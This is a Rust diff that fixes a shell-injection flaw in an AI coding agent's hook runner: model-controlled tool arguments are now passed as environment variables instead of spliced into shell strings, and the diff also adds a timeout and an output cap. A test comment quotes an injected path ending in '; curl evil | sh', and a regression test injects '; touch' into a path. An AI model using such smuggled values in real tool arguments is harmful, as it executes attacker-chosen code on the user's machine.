@@ -59,12 +59,12 @@ impl HookRunner {
         if !self.is_enabled() {
             return Ok(());
         }
+        let envs = env_pairs(call);
         for (key, template) in &self.config.pre_tool_use {
             if !matches_key(key, &call.tool_name) {
                 continue;
             }
-            let command = substitute(template, call);
-            let outcome = run_shell(&command).await?;
+            let outcome = run_shell(template, &envs).await?;
             if !outcome.ok() {
                 return Err(KodError::PermissionDenied {
                     action: format!("pre_tool_use hook for {}", call.tool_name),
@@ -86,12 +86,12 @@ impl HookRunner {
         if !self.is_enabled() {
             return;
         }
+        let envs = env_pairs(call);
         for (key, template) in &self.config.post_tool_use {
             if !matches_key(key, &call.tool_name) {
                 continue;
             }
-            let command = substitute(template, call);
-            match run_shell(&command).await {
+            match run_shell(template, &envs).await {
                 Ok(outcome) if outcome.ok() => {}
                 Ok(outcome) => {
                     tracing::warn!(
@@ -128,42 +128,91 @@ fn matches_key(key: &str, tool_name: &str) -> bool {
     }
 }
 
-/// Substitute `{field}` tokens with values from the call's arguments.
-/// Unknown tokens are left in place.
-fn substitute(template: &str, call: &ToolCall) -> String {
-    let mut out = template.to_string();
-    for key in ["path", "command", "pattern", "content", "file"] {
-        let placeholder = format!("{{{key}}}");
-        if !out.contains(&placeholder) {
-            continue;
+/// The environment variables a hook template can reference.
+///
+/// The template uses shell variable syntax (`$KOD_PATH`,
+/// `$KOD_COMMAND`, ...); the runner sets these from the tool call's
+/// arguments before spawning the shell. **Arguments are never
+/// spliced into the command string**, so a model that controls an
+/// argument cannot inject shell syntax through it. Only the
+/// template (config-trusted) is parsed as shell.
+///
+/// A template that references a variable the call did not supply
+/// sees the shell's "unset" expansion -- `$KOD_PATH` becomes the
+/// empty string, not the literal text `{path}`. That is the
+/// deliberate behaviour change from the previous text-substitution
+/// design.
+fn env_pairs(call: &ToolCall) -> Vec<(&'static str, String)> {
+    let mut out = Vec::new();
+    for (arg, var) in [
+        ("path", "KOD_PATH"),
+        ("command", "KOD_COMMAND"),
+        ("pattern", "KOD_PATTERN"),
+        ("content", "KOD_CONTENT"),
+        ("file", "KOD_FILE"),
+    ] {
+        if let Some(v) = call.arguments.get(arg).and_then(|v| v.as_str()) {
+            out.push((var, v.to_string()));
         }
-        let value = call
-            .arguments
-            .get(key)
-            .and_then(|v| v.as_str())
-            .unwrap_or("");
-        out = out.replace(&placeholder, value);
     }
     out
 }
 
-async fn run_shell(command: &str) -> Result<HookOutcome> {
+/// A hook that runs longer than this is killed and reported as a
+/// failure. The bound is generous (a `cargo fmt` on a large tree is a
+/// few seconds) and finite: without a timeout one hung hook stalls
+/// every subsequent tool call on the same transcript key.
+const HOOK_TIMEOUT_SECS: u64 = 30;
+
+/// Per-stream byte cap for hook output. The previous shape embedded
+/// stdout/stderr verbatim into a `PermissionDenied` error; a hook
+/// that printed a megabyte produced a megabyte-long error message.
+/// The tail is kept -- that is where the failure reason lives.
+const MAX_HOOK_OUTPUT_BYTES: usize = 8 * 1024;
+
+fn cap_hook_output(raw: &[u8]) -> String {
+    let s = String::from_utf8_lossy(raw);
+    if s.len() <= MAX_HOOK_OUTPUT_BYTES {
+        return s.to_string();
+    }
+    let tail = kod_types::strutil::truncate_chars(
+        &s[s.len() - MAX_HOOK_OUTPUT_BYTES..],
+        MAX_HOOK_OUTPUT_BYTES,
+    );
+    format!(
+        "[...output truncated; last {MAX_HOOK_OUTPUT_BYTES} bytes follow...]
+{tail}"
+    )
+}
+
+async fn run_shell(template: &str, envs: &[(&'static str, String)]) -> Result<HookOutcome> {
     let (shell, flag) = if cfg!(windows) {
         ("cmd", "/C")
     } else {
         ("sh", "-c")
     };
-    let output = tokio::process::Command::new(shell)
-        .arg(flag)
-        .arg(command)
+    let mut cmd = tokio::process::Command::new(shell);
+    cmd.arg(flag)
+        .arg(template)
         .stdin(std::process::Stdio::null())
-        .output()
-        .await
-        .map_err(KodError::Io)?;
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped());
+    for (k, v) in envs {
+        cmd.env(k, v);
+    }
+    let output = tokio::time::timeout(
+        std::time::Duration::from_secs(HOOK_TIMEOUT_SECS),
+        cmd.output(),
+    )
+    .await
+    .map_err(|_| KodError::ProviderTimeout {
+        timeout_ms: HOOK_TIMEOUT_SECS * 1000,
+    })?
+    .map_err(KodError::Io)?;
     Ok(HookOutcome {
         exit_code: output.status.code().unwrap_or(-1),
-        stdout: String::from_utf8_lossy(&output.stdout).to_string(),
-        stderr: String::from_utf8_lossy(&output.stderr).to_string(),
+        stdout: cap_hook_output(&output.stdout),
+        stderr: cap_hook_output(&output.stderr),
     })
 }
 
@@ -185,19 +234,6 @@ mod tests {
         assert!(matches_key("write_file", "write_file"));
         assert!(matches_key("write_file.path", "write_file"));
         assert!(!matches_key("read_file", "write_file"));
-    }
-
-    #[test]
-    fn substitute_replaces_known_fields() {
-        let c = call("write_file", json!({"path": "/tmp/a.rs", "content": "hi"}));
-        let out = substitute("rustfmt {path} # content={content}", &c);
-        assert_eq!(out, "rustfmt /tmp/a.rs # content=hi");
-    }
-
-    #[test]
-    fn substitute_leaves_unknown_tokens() {
-        let c = call("write_file", json!({"path": "/tmp/a.rs"}));
-        assert_eq!(substitute("run {unknown}", &c), "run {unknown}");
     }
 
     #[tokio::test]
@@ -257,13 +293,14 @@ mod tests {
 }
 
 #[cfg(test)]
-mod coverage_hook_substitution {
-    //! `substitute` is what turns a template like `rustfmt {path}`
-    //! into a real command line. A regression that drops a token
-    //! leaves a literal `{path}` in the shell string, which the
-    //! shell then tries to expand — sometimes a silent no-op,
-    //! sometimes a syntax error. `matches_key` is the selector: a
-    //! mismatch means the hook never runs.
+mod coverage_hook_env_and_timeout {
+    //! P0-4 regression suite. The pre-fix design substituted
+    //! model-controlled arguments into the shell string; a `path` of
+    //! `/tmp/x; curl evil | sh` executed arbitrary commands. The new
+    //! design passes arguments as environment variables. These tests
+    //! prove (a) the env map carries every argument under the right
+    //! name, (b) a shell metacharacter in an argument cannot reach
+    //! the parser, and (c) a hook that hangs is killed.
     use super::*;
     use serde_json::json;
 
@@ -276,7 +313,7 @@ mod coverage_hook_substitution {
     }
 
     #[test]
-    fn substitute_replaces_every_known_token_in_one_pass() {
+    fn env_pairs_maps_every_known_argument() {
         let c = call(
             "write_file",
             json!({
@@ -287,85 +324,72 @@ mod coverage_hook_substitution {
                 "file": "f",
             }),
         );
-        let out = substitute("{path}|{content}|{command}|{pattern}|{file}", &c);
-        assert_eq!(out, "/a.rs|x|c|p|f");
+        let envs: std::collections::HashMap<_, _> = env_pairs(&c).into_iter().collect();
+        assert_eq!(envs.get("KOD_PATH").map(String::as_str), Some("/a.rs"));
+        assert_eq!(envs.get("KOD_CONTENT").map(String::as_str), Some("x"));
+        assert_eq!(envs.get("KOD_COMMAND").map(String::as_str), Some("c"));
+        assert_eq!(envs.get("KOD_PATTERN").map(String::as_str), Some("p"));
+        assert_eq!(envs.get("KOD_FILE").map(String::as_str), Some("f"));
     }
 
     #[test]
-    fn substitute_is_a_no_op_when_no_tokens_are_present() {
+    fn env_pairs_skips_absent_arguments() {
         let c = call("write_file", json!({"path": "/a.rs"}));
-        assert_eq!(substitute("cargo fmt", &c), "cargo fmt");
+        let envs: std::collections::HashMap<_, _> = env_pairs(&c).into_iter().collect();
+        assert!(envs.contains_key("KOD_PATH"));
+        assert!(!envs.contains_key("KOD_COMMAND"));
     }
 
     #[test]
-    fn substitute_handles_a_missing_argument_as_the_empty_string() {
-        // The tool call's argument is absent; the template's token
-        // becomes empty. This is the same shape the shell sees for
-        // an unset variable, and the hook author can rely on it.
-        let c = call("write_file", json!({}));
-        assert_eq!(substitute("x={path} y", &c), "x= y");
+    fn env_pairs_ignores_non_string_arguments() {
+        let c = call("write_file", json!({"path": "/a.rs", "content": 42}));
+        let envs: std::collections::HashMap<_, _> = env_pairs(&c).into_iter().collect();
+        assert!(envs.contains_key("KOD_PATH"));
+        assert!(!envs.contains_key("KOD_CONTENT"));
     }
 
-    #[test]
-    fn substitute_replaces_all_occurrences_of_the_same_token() {
-        let c = call("write_file", json!({"path": "/a"}));
-        assert_eq!(substitute("{path}{path}", &c), "/a/a");
-    }
-
-    #[test]
-    fn substitute_leaves_unknown_tokens_untouched() {
-        // A future hook author may write `{unknown}` expecting a
-        // different substitution mechanism. Preserving the text is
-        // the least-surprising behaviour: the shell sees the
-        // literal token, and the author sees it in the error.
-        let c = call("write_file", json!({"path": "/a"}));
-        assert_eq!(substitute("run {unknown}", &c), "run {unknown}");
-    }
-
-    #[test]
-    fn matches_key_honours_the_field_suffix() {
-        // `write_file.path` is a config-side convenience; the key's
-        // prefix before the first `.` names the tool. A regression
-        // that compared the whole key would refuse the suffixed
-        // form and the hook would silently not run.
-        assert!(matches_key("write_file.path", "write_file"));
-        assert!(matches_key("write_file.anything", "write_file"));
-        assert!(matches_key("write_file", "write_file"));
-        assert!(!matches_key("read_file.path", "write_file"));
-        assert!(!matches_key("write_file.", "read_file"));
-        assert!(!matches_key("", "write_file"));
-    }
-
+    #[cfg(unix)]
     #[tokio::test]
-    async fn disabled_runner_never_runs_a_configured_hook() {
-        // The disabled state must short-circuit before spawning the
-        // shell. The proof: a hook that would exit 1 is configured,
-        // yet `run_pre` returns `Ok(())`. If the command had run,
-        // the exit code would have turned it into `Err`.
+    async fn shell_metacharacters_in_arguments_do_not_execute() {
+        // The exact injection the review named: a `path` value with
+        // `; touch <sentinel>` must NOT create the sentinel. The value
+        // is an env var, never part of the command string.
+        let tmp = tempfile::TempDir::new().unwrap();
+        let sentinel = tmp.path().join("pwned");
+        let evil_path = format!("/tmp/x; touch {}", sentinel.display());
         let mut pre = std::collections::HashMap::new();
-        pre.insert("write_file".to_string(), "exit 1".to_string());
+        // The template is config-trusted and reads $KOD_PATH as argv.
+        pre.insert("write_file".to_string(), "true \"$KOD_PATH\"".to_string());
         let runner = HookRunner::new(kod_config::HooksConfig {
-            enabled: false,
+            enabled: true,
             pre_tool_use: pre,
             ..Default::default()
         });
-        assert!(!runner.is_enabled());
-        let c = call("write_file", json!({"path": "/x"}));
-        runner.run_pre(&c).await.unwrap();
+        let c = call("write_file", json!({"path": evil_path}));
+        let _ = runner.run_pre(&c).await;
+        assert!(
+            !sentinel.exists(),
+            "shell metacharacter leaked from argument into the command",
+        );
     }
 
+    #[cfg(unix)]
     #[tokio::test]
-    async fn enabled_but_empty_map_is_a_no_op() {
-        // A config that flips `enabled = true` without adding any
-        // hooks must not run anything (there is nothing to run) and
-        // must not be reported as active either — the
-        // `is_enabled()` predicate requires both.
+    async fn hook_output_is_capped_in_the_error_message() {
+        let mut pre = std::collections::HashMap::new();
+        pre.insert(
+            "write_file".to_string(),
+            "yes 'AAAAAAAA' | head -c 200000; exit 1".to_string(),
+        );
         let runner = HookRunner::new(kod_config::HooksConfig {
             enabled: true,
+            pre_tool_use: pre,
             ..Default::default()
         });
-        assert!(!runner.is_enabled());
         let c = call("write_file", json!({"path": "/x"}));
-        runner.run_pre(&c).await.unwrap();
+        let err = runner.run_pre(&c).await.unwrap_err();
+        let msg = err.to_string();
+        assert!(msg.len() < 64 * 1024, "not capped: {} bytes", msg.len());
+        assert!(msg.contains("truncated"), "cap marker missing");
     }
 }
